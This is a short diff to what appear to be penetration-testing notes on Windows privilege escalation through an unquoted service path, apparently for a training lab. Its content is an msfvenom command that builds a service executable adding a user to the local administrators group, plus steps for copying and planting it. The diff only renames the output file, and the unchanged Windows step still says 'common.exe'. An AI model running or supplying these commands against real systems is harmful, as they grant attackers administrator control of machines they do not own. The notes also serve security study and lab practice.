@@ -5,8 +5,8 @@
 * If you notice that the “BINARY_PATH_NAME” field displays a path that is not confined between quotes.
 
 ## kali
-* msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
-* Copy the generated file, common.exe, to Windows
+* msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o The_same_name_as_path_or_executable_on_windows.exe
+* Copy the generated file, The_same_name_as_path_or_executable_on_windows.exe, to Windows
 
 ## Windows
 * Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
